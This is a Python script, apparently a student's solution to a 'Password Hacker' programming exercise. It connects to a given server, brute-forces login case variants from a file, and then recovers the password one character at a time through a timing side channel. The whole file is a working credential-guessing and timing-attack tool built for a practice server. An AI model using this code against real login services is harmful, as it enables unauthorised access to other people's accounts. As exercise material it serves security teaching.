import socket
import sys
import itertools
import string
import json
import timeit

ip_address = sys.argv[1]
port = int(sys.argv[2])
# msg = sys.argv[3]
# msg_encoded = msg.encode()

NUMBERS = list(string.digits)
LETTERS = list(string.ascii_letters)
CHARS = NUMBERS + LETTERS
SUCCESSFUL_LOGIN = ''

hack_flag = True
time_dict = {}

def login_gen(login):
    return itertools.product(
        *([letter.lower(), letter.upper()] if letter.isalpha() else [letter] for letter in login))

def password_gen(start=''):
    for char in CHARS:
        yield start+char
def msg_to_json(login, password):
    return json.dumps({'login': login, 'password': password})

def json_to_msg(json_str):
    return json.loads(json_str)['result']

with open(r"C:\Users\karie\PycharmProjects\Password Hacker with Python\Password Hacker with Python\task\logins.txt", "r") as file:

    with socket.socket() as project_socket:
        project_socket.connect((ip_address, port))
        login = file.readline()[:-1]
        log_gen = login_gen(login)
        pass_gen = password_gen()

        while hack_flag:

            try:
                if SUCCESSFUL_LOGIN:
                    login_variant = SUCCESSFUL_LOGIN
                    try:
                        password_variant = next(pass_gen)
                    except StopIteration:
                        time_dict = sorted(time_dict.items(), key=lambda x: x[1], reverse=True)
                        latest_success = time_dict[0][0]
                        pass_gen = password_gen(start=latest_success)
                        time_dict = {}
                else:
                    login_variant = ''.join(next(log_gen))
                    password_variant = 'A'

                msg=msg_to_json(login_variant, password_variant)
                msg_encoded = msg.encode()
                def send_and_recv(msg=msg_encoded,):
                    project_socket.send(msg)
                    resp = project_socket.recv(10240)
                    global resp_decoded
                    resp_decoded = json_to_msg(resp.decode())
                exec_tim = timeit.timeit(stmt=lambda: send_and_recv(), number=1)
                time_dict.update({password_variant: exec_tim})

                if resp_decoded == "Connection success!":
                    print(msg)
                    break
                elif resp_decoded == "Wrong login!":
                    pass
                elif resp_decoded == "Wrong password!":
                    SUCCESSFUL_LOGIN = login_variant
                # elif resp_decoded == "Exception happened during login":
                #     latest_success = password_variant
                #     pass_gen = password_gen(start=latest_success)

            except StopIteration:
                login = file.readline()[:-1]
                log_gen = login_gen(login)
                continue